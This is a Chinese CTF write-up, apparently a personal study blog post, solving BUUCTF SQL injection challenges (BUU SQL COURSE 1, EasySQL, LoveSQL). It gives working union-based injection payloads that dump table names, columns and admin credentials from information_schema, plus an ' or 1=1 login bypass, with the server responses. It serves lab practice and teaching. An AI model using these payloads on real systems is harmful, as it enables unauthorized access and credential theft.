---
title: SQL注入刷题--buuctf
categories:
  - 学习
tags:
  - SQL注入
  - WP
abbrlink: c1646dc5
---

### BUU SQL COURSE 1 

#### 流程

这题是写sqli-labs后刷 的，确实带来一点不一样的感觉。

依照sqli-labs的惯性，是在登录里面进行sql注入。

不过用弱口令试了几次，发现没什么用。因此去找了WP。

发现sql注入是可以不在登录界面进行的，没有思路的时候可以在网络里找找线索。

按F12打开网络，点击测试新闻1，可以发现一个`content_detail.php?id=1`不正常的名字，因此尝试访问url`http://0a577521-dfc0-45cf-8bc5-2bd8255566bd.node5.buuoj.cn:81/backend/content_detail.php?id=1`，有回显。

修改id内容判断是否存在sql注入

尝试了`id=1' %23` `id =1" %23`发现都没有回显，也没有报错，再用逻辑判断也没有用，接着尝试`id=1 and 1=1 和 id=1 and 1=2`，发现前者回显正常，后者没有回显，因此是数字型注入。~~判断的时候科技园先尝试数字型注入，去除之后再进行字符型注入判断~~

判断列数

`id=1 order by 3`发现没有回显，再减少列数`id =1 order by 2`回显正常（？为什么减少，这里应该从1开始慢慢尝试）

判断回显位

~~懒得喷，校园网在这里没有办法进行~~

`id=-1 union select 1,2 %23`回显1,2

接下来就可以联合查询了

```sql
#获取库名表名
?id=-1 union select database(),(select group_concat(table_name)from information_schema.tables where table_schema=database())%23
{"title":"news","content":"admin,contents"}

#获取列名（这里刚开始查错表了，显示null，）
id=-1 union select database(),(select group_concat(column_name)from information_schema.columns where table_name='admin')%23
{"title":"news","content":"id,username,password"}

#获取数据
id=-1 union select database(),(select group_concat(id,'~',username,'~',password)from admin)%23
{"title":"news","content":"1~admin~c594fc56796ff9e90d5f56f186b889b5"}
```

这里获取到的`c594fc56796ff9e90d5f56f186b889b5`实际上是password的内容，并不是flag，还要回到登录页面，用账号密码`admin=admin password=c594fc56796ff9e90d5f56f186b889b5`登录查看，便可以成功获取flag

#### 总结

##### 登录页面

碰到这种登录页面，如果没有注册内容，或者其他可以操作的地方，那么可能只是弱口令？报错等正常直接的注入方式。但如果有注册内容，或者比如这题热点1存在附件，多学到了一种思路，~~nice try~~

##### 注入点判断

这题的注入点和sqli-labs的注入点不太一样，乐，学到了。当没有思路的时候可以用网络看看是不是存在一些附件内容，比如这题的文件。

##### 获取库名、列名、数据名

emmmm，不好说这里。写了这么多题目，还没有做到flag不在当前库下的，所以在**获取到一堆库**的时候，不用太担心查询问题，只要先顺着当前库往下查看就可以了

**获取好几个表？** 目前的办法是大部分flag都是`user`或者特定名字中，常规的id，email表，可以先不查看

**列、数据**一个一个尝试就行了，大部分不是很多

## [极客大挑战 2019]

### [极客大挑战 2019]EasySQL

#### 流程

常见的登录页面，目前的习惯是先输入1 再用hackbar拿到提交内容后修改。提交`http://c17025a5-5a8c-461c-ac6f-65ae18e70e19.node5.buuoj.cn:81/check.php?username=1&password=1`，回显`NO!`

**这里说明了** 用户1是不在已有数据库中的，**所以**`id=1 `之后跟着的应该是`or`，用`and`会因为 前者`id=1`不存在一定是false，因而只能使用`id =1' or 1=1 %23`来尝试闭合 ~~好像就是弱口令原理？~~

`?username=1&password=1' or 1=1%23` 使用这个弱口令直接回显flag了

### [极客大挑战 2019]LoveSQL

#### 流程

这题是上面easysql的延伸，所以还是尝试弱口令。发现可以直接登录，回显是账号密码，换成账号密码登录之后发现，和弱口令登录的回显一样。

根据开始页面的提示`这次我把它们放在了那个地方，哼哼！`，有点像放在数据库中的意思，所以可以尝试一下联合查询

~~闭合符用弱口令的时候已经知道了，是单引号闭合，接下来就是查看列数~~

**查看列数**

~~?先尝试~~`?username=1' order by 5%23&password=1`发现回显`Unknown column '5' in 'order clause'` 说明存在联合查询，剩下的按照正常流程来就行

尝试到`1' order by 3`回显`NO！`,**说明**查询语句是正确的，只是因为用户1不存在数据库中（验证方法：把1改成admin就可以正常登录了，回显内容和弱口令登录一样）

**查看回显位**

`?username=1' union select 1,2,3%23&password=1`回显2,3位置

**启动联合查询**

```sql
#获取库名
?username=1' union select 1,database(),3%23&password=1
#回显 Hello geek！Your password is '3'

#获取表名
?username=1' union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database())%23&password=1
#回显 Hello 2！Your password is 'geekuser,l0ve1ysq1'

#获取列名
?username=1' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name='geekuser')%23&password=1
#回显 Hello 2！Your password is 'id,username,password'

#获取数据（啊WC怎么第一次又查错表了啊）
?username=1' union select 1,2,(select group_concat(id,'~',username,'~',password)from l0ve1ysq1)%23&password=1
```

然后就可以查看flag了~~太多了不方便可以打开源代码查看~~

### [极客大挑战 2019]BabySQL

~~不想写了~~

#### 流程

